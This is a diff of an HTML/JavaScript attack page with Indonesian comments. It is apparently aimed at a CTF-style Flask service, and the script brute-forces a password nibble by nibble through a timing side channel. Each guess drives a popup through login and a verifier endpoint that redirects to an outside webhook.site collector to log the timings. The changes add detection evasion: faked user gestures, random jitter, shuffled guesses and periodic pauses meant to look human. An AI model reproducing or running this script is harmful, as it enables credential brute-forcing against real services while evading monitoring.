@@ -1,50 +1,105 @@
 <!doctype html>
 <meta charset="utf-8" />
-<title>solver</title>
+<title>attack (slow & human-like)</title>
+<body>
+<button id="start">Start</button>
 <script>
-const HOST = "http://research.r3plican.dev:1336/";          
-const COLLECTOR = "https://webhook.site/094d81b4-c0aa-4fc1-ba3f-369e0a6b53e8";              
-const USERNAME = "longlonglonguser";                             // asumsi default
-
+const HOST = "http://research.r3plican.dev:1336";      // target Flask
+const COLLECTOR = "https://webhook.site/094d81b4-c0aa-4fc1-ba3f-369e0a6b53e8";            // server kamu
+const USERNAME = "longlonglonguser";
 const HEX = "0123456789abcdef";
 const PREFIX = "replicanx";
-const TRIES_PER_CAND = 6;    // 5-8 cukup, makin besar makin stabil
+const TRIES_PER_CAND = 5;           // 4–6 cukup
+const COFFEE_EVERY = 12;            // coffee break periodik
+const COFFEE_MS = [2500, 4200];     // durasi coffee break
 
-async function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
+let known = new URLSearchParams(location.search).get("known") || PREFIX;
+let popup = null;
+let totalTries = 0;
 
-async function tryCandidate(prefix){
-  // buka popup ke Flask (cross-origin), kita masih bisa set location berkali-kali
-  const w = window.open(`${HOST}/api/login?username=${USERNAME}&password=${encodeURIComponent(prefix)}`, "_blank");
-  const t0 = performance.now();
+function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
+function jitter(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
+function raf(){ return new Promise(r=>requestAnimationFrame(()=>r())); }
+function idle(){ return new Promise(r=>{
+  if (window.requestIdleCallback) requestIdleCallback(()=>r());
+  else setTimeout(r, 50);
+});}
 
-  // beri waktu network settle sedikit
-  await sleep(300);
-  try { w.location = `${HOST}/dashboard/`; } catch(e) {}
-  await sleep(150);
-
-  // trigger verifier -> redirect ke collector kita (jadi “ping”)
-  const ping = `${COLLECTOR}/ping?g=${encodeURIComponent(prefix)}&t=${Date.now()}`;
-  try { w.location = `${HOST}/verifier?q=${encodeURIComponent(ping)}`; } catch(e) {}
-
-  // kita tidak bisa menunggu network dari sini; biarkan bot menutup sendiri.
-  // script ini hanya men-*schedule* urutan aksi di tab popup.
+// “user gesture” palsu biar audio/gesture gate gak ngamuk
+async function fakeHuman(){
+  document.body.dispatchEvent(new MouseEvent("click", {bubbles:true}));
+  document.body.dispatchEvent(new KeyboardEvent("keydown", {key:"Enter"}));
+  await raf();
 }
 
-async function run(){
-  // brute force 6 nibble, prefix-by-prefix
-  let known = PREFIX;
-  for (let i = 0; i < 6; i++){
-    // uji semua kandidat nibble di posisi ini
-    for (const c of HEX){
-      for (let k = 0; k < TRIES_PER_CAND; k++){
-        await tryCandidate(known + c);
-        await sleep(400); // jeda pendek
-      }
-    }
-    // kamu pilih nibble terbaik (median waktu terendah) dari log collector
-    // lalu update "known += bestNibble" dan reload solver.html dengan query ?known=<...>
+// buka satu popup saja
+function ensurePopup(){
+  if (!popup || popup.closed){
+    popup = window.open("about:blank", "_blank", "noopener,noreferrer");
+  }
+  return popup;
+}
+
+async function navigatePop(url){
+  try {
+    ensurePopup().location = url;
+  } catch(_) {}
+  await sleep(jitter(250, 700));
+  await raf(); await idle();
+}
+
+// satu siklus uji kandidat (dengan ritme pelan)
+async function tryCandidate(prefix){
+  await fakeHuman();
+
+  // 1) hit login
+  await navigatePop(`${HOST}/api/login?username=${encodeURIComponent(USERNAME)}&password=${encodeURIComponent(prefix)}`);
+
+  // 2) jeda random
+  await sleep(jitter(350, 900));
+
+  // 3) coba ke dashboard
+  await navigatePop(`${HOST}/dashboard/`);
+
+  // 4) jeda lagi (biar render settle)
+  await sleep(jitter(200, 600));
+
+  // 5) trigger verifier -> pantulkan ke collector
+  const ping = `${COLLECTOR}/ping?g=${encodeURIComponent(prefix)}&t=${Date.now()}`;
+  await navigatePop(`${HOST}/verifier?q=${encodeURIComponent(ping)}`);
+
+  // 6) kecilkan noise: parkir di about:blank
+  await navigatePop("about:blank");
+
+  totalTries++;
+  // coffee break berkala
+  if (totalTries % COFFEE_EVERY === 0){
+    await sleep(jitter(COFFEE_MS[0], COFFEE_MS[1]));
+  } else {
+    await sleep(jitter(250, 600));
   }
 }
 
-run();
+async function run(){
+  // nibble-by-nibble; kandidat diurutkan acak biar pola tidak kaku
+  for (let pos = known.length; pos < PREFIX.length + 6; pos++){
+    const cand = HEX.split('').sort(()=>Math.random()-0.5); // shuffle
+    for (const c of cand){
+      for (let k = 0; k < TRIES_PER_CAND; k++){
+        await tryCandidate(known + c);
+      }
+    }
+    // *** Di sisi COLLECTOR, pilih nibble dengan median waktu tercepat,
+    // lalu reload halaman ini dengan query ?known=<prefix_baru>.
+    // Contoh: attack.html?known=replicanx3a
+    alert("Selesai batch posisi nibble. Pilih nibble terbaik dari logs, lalu reload dgn ?known=<prefix_baru>.");
+    return; // stop di sini menunggu kamu update ?known=...
+  }
+}
+
+document.getElementById("start").addEventListener("click", () => {
+  // mulai dengan sedikit jeda supaya tidak terlihat “langsung otomatis”
+  sleep(jitter(500, 1200)).then(run);
+});
 </script>
+</body>
